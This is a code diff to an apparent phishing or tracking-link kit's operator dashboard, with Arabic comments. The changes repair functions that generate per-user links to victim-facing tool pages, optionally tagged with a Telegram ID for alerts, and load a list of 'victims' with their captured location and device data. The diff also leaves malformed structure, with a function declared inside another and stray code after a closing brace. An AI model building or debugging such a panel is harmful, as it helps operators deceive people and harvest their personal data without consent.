@@ -61,8 +61,7 @@
         .page.active { display: block; animation: zoomIn 0.3s ease; }
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
 
-        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; } 
-
+        .links-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
         .tool-card { 
             background: var(--surface); border: 1px solid #1a1a1a; border-right: 4px solid var(--primary);
             padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s;
@@ -943,21 +942,29 @@ button[onclick*="save"]:hover {
             return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
         }
 
-        // تعديل الرابط ليكون متوافق مع ملف victim.html
-        const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
-const link = `${baseUrl}/${toolValue}.html?user_id=${user}`; 
-
-        
-        document.getElementById('tool-link-display').innerText = link;
-        document.getElementById('copy-tool-btn').onclick = () => {
-            navigator.clipboard.writeText(link);
-            showAlert("COPIED", "Link copied ✅");
-        };
-        
-        const toolObj = tools.find(t => t.value === toolValue);
-        nav('tool', toolObj.name, '⚙️', null);
-        loadVictims(toolValue, user);
+async function openToolPage(toolValue) {
+    const user = localStorage.getItem('logged_user');
+    const permSnap = await db.ref('permissions/' + user + '/' + toolValue).once('value');
+    
+    if(permSnap.val() === false) {
+        return showAlert("ACCESS DENIED 🚫", "هذا القسم مغلق لحسابك.");
     }
+
+    const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
+    
+    // ✅ هنا برضه استخدم اسم الأداة
+    const link = `${baseUrl}/${toolValue}.html?user_id=${user}&tool=${toolValue}`;
+    
+    document.getElementById('tool-link-display').innerText = link;
+    document.getElementById('copy-tool-btn').onclick = () => {
+        navigator.clipboard.writeText(link);
+        showAlert("COPIED", "Link copied ✅");
+    };
+    
+    const toolObj = tools.find(t => t.value === toolValue);
+    nav('tool', toolObj.name, '⚙️', null);
+    loadVictims(toolValue, user);
+}
 
     // تعديل جلب الضحايا لعرض البيانات الجديدة (الموقع والجهاز)
     function loadVictims(tool, user) {
@@ -998,26 +1005,22 @@ const link = `${baseUrl}/${toolValue}.html?user_id=${user}`;
     }
 
     function generateCustomLink() {
-        const tool = document.getElementById('tool-select').value;
-        const telegramId = document.getElementById('telegram-id').value || "";
-        const user = localStorage.getItem('logged_user');
-        
-        const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
-        
-        // بناء الرابط مع ID التليجرام إذا تم إدخاله
-        let link = `${baseUrl}/${toolValue}.html?user_id=${user}`; 
-
-        
-        // إضافة ID التليجرام للرابط إذا كان موجود
-        if (telegramId.trim() !== "") {
-            link += `&telegram=${telegramId.trim()}`;
-            
-            // حفظ ID التليجرام في قاعدة البيانات
-            saveTelegramIdToDB(user, telegramId.trim());
-        }
-        
-        document.getElementById('final-link').innerText = link;
-        document.getElementById('generated-result').style.display = 'block';
+    const tool = document.getElementById('tool-select').value;
+    const telegramId = document.getElementById('telegram-id').value || "";
+    const user = localStorage.getItem('logged_user');
+    
+    const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
+    
+    // ✅ ده الحل: استخدم اسم الأداة نفسه كاسم ملف
+    let link = `${baseUrl}/${tool}.html?user_id=${user}&tool=${tool}`;
+    
+    if (telegramId.trim() !== "") {
+        link += `&telegram=${telegramId.trim()}`;
+    }
+    
+    document.getElementById('final-link').innerText = link;
+    document.getElementById('generated-result').style.display = 'block';
+}
         
         // إظهار رسالة تأكيد
         if (telegramId.trim() !== "") {
